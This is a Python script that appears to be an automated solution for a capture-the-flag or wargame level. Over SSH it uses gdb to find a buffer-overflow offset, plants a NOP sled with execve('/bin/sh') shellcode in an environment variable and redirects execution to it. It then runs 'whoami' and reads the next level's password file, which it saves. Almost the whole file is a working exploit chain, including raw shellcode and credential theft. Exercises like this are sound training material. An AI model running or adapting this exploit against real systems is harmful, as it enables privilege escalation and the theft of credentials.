import os
import sys

bool('Ressources' in os.getcwd()) if sys.path.append("../") else sys.path.append("../..")
from utils.ssh import exec, connect_by_previous, find_offset, get_func_structure
from utils.text import print_output, print_title
from utils.base import save_token, address_to_string

client = connect_by_previous()

files_list = exec(client, 'ls', title='Get files list')
print_output(files_list, 'Files')
print_title('Test this file')

binary_name = files_list[0]

exec(client, f'./{binary_name}', title='Simple execute binary')
print_title('Nothing happened')

exec(client, f'./{binary_name} test', title='Execute with arg')
print_title('Nothing happened')

exec(client, f'./{binary_name} test test', title='Two args?')
print_title('Nothing happened')
print_title("Not usual!")

print_title("Let's find the border of the possible")
for i, _ in enumerate(range(150)):
    output = exec(client, f"echo 'r {'.' * (i + 1)}\nq\n' | gdb ./{binary_name} -q", silent=True)
    print_title(f'{i + 1} char', end='\r')
    if len(output) == 10:
        print_title(f'Segfault at {i + 1} char')
        break
print_title('Okay, debug time')

offset = find_offset(client, register='eax', title='Find register offset')

main_structure = get_func_structure(
    client, 'main', title='Our arg sending in program copied to buffer at (+136) '
                          'step important for us')
var_address = exec(client, f'echo "b *main+136\nr test\nx/x \$eax\nq\ny\n" | gdb ./{binary_name} -q | '
                           f'awk \'{{print $2}}\' | '
                           f'sed \'s/://\'', title='Find variable address where copying our buffer')[5]
print_output(var_address, 'Variable address')


env_name = 'exploit'
shellcode = "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3" \
            "\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80"
export_shellcode = f'export {env_name}=$(python -c \'print "\\x90" * 1000 + "{shellcode}"\')'

env_address = exec(client, f'{export_shellcode} && echo "b *main\nr\nx/200s environ\n" | '
                           f'gdb ./{binary_name} -q | '
                           f'grep "{env_name}" | '
                           f'awk \'{{print $1}}\' | sed \'s/://\'', title=f'Find shell code `{env_name}` address')[0]
print_output(env_address, f'Env #{env_name} address')
env_address = exec(client, f'{export_shellcode} && echo "b *main\nr\nx/200xg {env_address}\n" | '
                           f'gdb ./{binary_name} -q | '
                           f'head -n 15 | '
                           f'awk \'{{print $1}}\' | '
                           f'sed \'s/://\'', title='Search a little deeper...')[7]
print_output(env_address, f'Env #{env_name} address, finally')

f = lambda command: f'{export_shellcode} && echo "{command}" | ' \
                    f'./{binary_name} $(python -c \'print "{address_to_string(env_address)}" + ' \
                    f'"." * {offset - 4} + "{address_to_string(var_address)}"\')'

exec(client, f('\\x03'), title='Export shell code, and rewrite buffer to call env')
print_title('Stdin intercepted, nice!')

output = exec(client, f('whoami'), title='Check user')
print_output(output, 'Current user')
print_title('Woo-hoo! Steal the password? Yeeeap!')

token = exec(client, f('cat /home/user/bonus0/.pass'), title='Steal the password...')

save_token(token)
